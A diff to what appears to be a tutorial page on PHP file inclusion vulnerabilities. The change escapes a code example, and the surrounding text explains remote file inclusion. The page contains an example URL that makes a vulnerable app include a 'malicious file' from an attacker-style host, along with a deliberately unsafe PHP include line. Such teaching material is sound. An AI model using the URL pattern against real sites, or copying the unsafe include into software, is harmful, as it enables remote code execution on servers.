@@ -175,5 +175,5 @@ When an attacker is exploiting RFI, he uses a remote file, while on the other si
 On the other hand, while exploiting RFI you can upload files from a remote server which in 99% of the cases will result in RCE(Remote Code Execution). Nowadays it's very rare to see RFI in the wild, because including files from remote location is disabled in PHP by default (<code>allow_url_include</code>).
 Example for RFI: <code>https://localhost/app.php?file=http://attackers.website.com/somemaliciousfile</code>. You could execute malicious code from the <code>somemaliciousfile</code> file and use it for malicious intention. <br>
 
-Take this code for example: <code><?php include $_GET['file']; ?></code>
+Take this code for example: <code>&lt;?php include $_GET['file']; ?&gt;</code>
 
